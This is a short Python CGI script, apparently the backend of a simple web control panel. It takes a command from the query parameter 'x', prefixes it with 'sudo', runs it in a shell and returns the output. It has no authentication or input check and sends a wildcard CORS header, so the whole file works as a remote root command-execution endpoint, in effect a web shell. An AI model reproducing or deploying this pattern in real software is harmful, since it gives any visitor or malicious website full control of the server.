#!/usr/bin/python3
print("content-type: text/html")     
print("Access-Control-Allow-Origin:*")
print()                           

import cgi                           
import subprocess

y = cgi.FieldStorage()
cmd = y.getvalue("x")
output = subprocess.getoutput("sudo " + cmd)
print(output)
                         
